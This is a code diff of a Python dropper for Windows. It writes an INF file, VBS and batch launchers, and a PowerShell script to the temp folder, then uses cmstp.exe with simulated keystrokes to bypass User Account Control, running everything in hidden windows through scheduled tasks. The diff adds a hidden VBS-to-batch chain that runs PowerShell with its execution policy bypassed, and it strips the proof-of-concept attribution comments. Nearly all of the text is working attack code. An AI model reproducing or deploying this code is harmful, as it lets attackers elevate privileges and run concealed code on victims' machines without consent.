@@ -21,7 +21,6 @@ def create_inf_file():
     RunPreSetupCommands=RunPreSetupCommandsSection
 
     [RunPreSetupCommandsSection]
-    ; Commands to run before setup begins
     taskkill /IM cmstp.exe /F
     cmd /c start {temp_folder}\\ddd.vbs
 
@@ -42,45 +41,47 @@ def create_inf_file():
 
     return inf_file_path
 
+def create_zzz_bat():
+    temp_folder = os.getenv('TEMP')
+    vbs_content2 = f'''powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File a.ps1" '''
+    vbs_path2 = os.path.join(temp_folder, "zzz.bat")
+    with open(vbs_path2, 'w') as f:
+        f.write(vbs_content2)
+    return vbs_path2
+
+
+def create_zzz_vbs():
+    temp_folder = os.getenv('TEMP')
+    exe_path = os.path.join(temp_folder, "zzz.bat")
+    vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run Chr(34) & "{exe_path}" & Chr(34), 0
+Set WshShell = Nothing'''
+    vbs_path = os.path.join(temp_folder, "zzz.vbs")
+    with open(vbs_path, 'w') as f:
+        f.write(vbs_content)
+    return vbs_path
+
 def create_a_ps1():
     ps_code = '''
-# UAC Bypass poc using SendKeys
-# Version 1.0
-# Author: Oddvar Moe
-# Functions borrowed from: https://powershell.org/forums/topic/sendkeys/
-# Todo: Hide window on screen for stealth
-# Todo: Make script edit the INF file for command to inject...
-
-# Point this to your INF file containing your juicy commands...
+# PowerShell script content
 $InfFile = "$env:TEMP\\corpvpn.inf"
 
 Function Get-Hwnd {
     [CmdletBinding()]
-    Param (
-        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
-        [string] $ProcessName
-    )
+    Param ([string] $ProcessName)
     Process {
-        $ErrorActionPreference = 'Stop'
         Try {
             $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
         } Catch {
             $hwnd = $null
         }
-        $hash = @{
-            ProcessName = $ProcessName
-            Hwnd        = $hwnd
-        }
-        New-Object -TypeName PsObject -Property $hash
+        New-Object -TypeName PsObject -Property @{ ProcessName = $ProcessName; Hwnd = $hwnd }
     }
 }
 
 function Set-WindowActive {
     [CmdletBinding()]
-    Param (
-        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
-        [string] $Name
-    )
+    Param ([string] $Name)
     Process {
         $memberDefinition = @'
         [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
@@ -89,68 +90,40 @@ function Set-WindowActive {
         Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
         $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
         If ($hwnd) {
-            $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
             [User32.Api]::SetForegroundWindow($hwnd)
-            [User32.Api]::ShowWindow($hwnd, 0)  # Pencereyi gizli hale getirmek için 0 kullanılır
-        } Else {
-            [string] $hwnd = 'N/A'
+            [User32.Api]::ShowWindow($hwnd, 0)
         }
-        $hash = @{
-            Process = $Name
-            Hwnd    = $hwnd
-        }
-        New-Object -TypeName PsObject -Property $hash
+        New-Object -TypeName PsObject -Property @{ Process = $Name; Hwnd = $hwnd }
     }
 }
 
-#Needs Windows forms
 Add-Type -AssemblyName System.Windows.Forms
-
-#Command to run
 $ps = New-Object System.Diagnostics.ProcessStartInfo "c:\\windows\\system32\\cmstp.exe"
 $ps.Arguments = "/au $InfFile"
 $ps.UseShellExecute = $false
-$ps.CreateNoWindow = $true  # Bu özellik işlemi görünmez yapar
+$ps.CreateNoWindow = $true
+[System.Diagnostics.Process]::Start($ps) | Out-Null
 
-#Start it
-[System.Diagnostics.Process]::Start($ps) | Out-Null  # Out-Null ile çıktıyı engelledik
-
-do {
-    # Do nothing until cmstp is an active window
-} until ((Set-WindowActive cmstp).Hwnd -ne 0)
-
-#Activate window
+do {} until ((Set-WindowActive cmstp).Hwnd -ne 0)
 Set-WindowActive cmstp
-
-#Send the Enter key
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 '''
-
     temp_folder = os.getenv('TEMP')
     a_ps1_path = os.path.join(temp_folder, 'a.ps1')
     with open(a_ps1_path, 'w') as f:
         f.write(ps_code)
-
     return a_ps1_path
 
 def main():
-    # Delete old tasks
     run_command('schtasks /delete /tn "InstallRequests" /f')
     run_command('schtasks /delete /tn "RunPowerShellScript" /f')
 
-    # Check if Python is installed
     returncode, stdout, stderr = run_command("python --version")
     if returncode != 0:
-        # Python is not installed. Start Python installation...
         returncode, stdout, stderr = run_command('first.exe /quiet InstallAllUsers=0 PrependPath=1')
         if returncode != 0:
             sys.exit(1)
-        else:
-            pass
-    else:
-        pass
 
-    # Create and schedule install_requests.py
     temp_dir = os.getenv('TEMP')
     script_path = os.path.join(temp_dir, 'install_requests.py')
     with open(script_path, 'w') as script_file:
@@ -161,27 +134,25 @@ def main():
     if returncode != 0:
         print(f"Failed to create task 'InstallRequests': {stderr}")
         sys.exit(1)
-
-    # Run the task
     run_command('schtasks /run /tn "InstallRequests"')
 
-    # Wait for task completion or timeout, then clean up
     time.sleep(10)
     os.remove(script_path)
 
-    # Create and schedule PowerShell script
     a_ps1_path = create_a_ps1()
-    if os.path.exists(a_ps1_path):
-        returncode, stdout, stderr = run_command(f'schtasks /create /tn "RunPowerShellScript" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {a_ps1_path}" /sc once /st 00:00 /f')
-        if returncode != 0:
-            print(f"Failed to create task 'RunPowerShellScript': {stderr}")
-            sys.exit(1)
-        run_command('schtasks /run /tn "RunPowerShellScript"')
-    else:
-        print("PowerShell script file does not exist.")
+    zzz_vbs_path = create_zzz_vbs()
+    zzz_bat_path = create_zzz_bat()
 
-    # Create INF file if necessary
-    inf_file_path = create_inf_file()
+    # if os.path.exists(a_ps1_path):
+    #     returncode, stdout, stderr = run_command(f'schtasks /create /tn "RunPowerShellScript" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {a_ps1_path}" /sc once /st 00:00 /f')
+    #     if returncode != 0:
+    #         print(f"Failed to create task 'RunPowerShellScript': {stderr}")
+    #         sys.exit(1)
+    #     run_command('schtasks /run /tn "RunPowerShellScript"')
+    # else:
+    #     print("PowerShell script file does not exist.")
+
+    create_inf_file()
 
 if __name__ == "__main__":
     main()
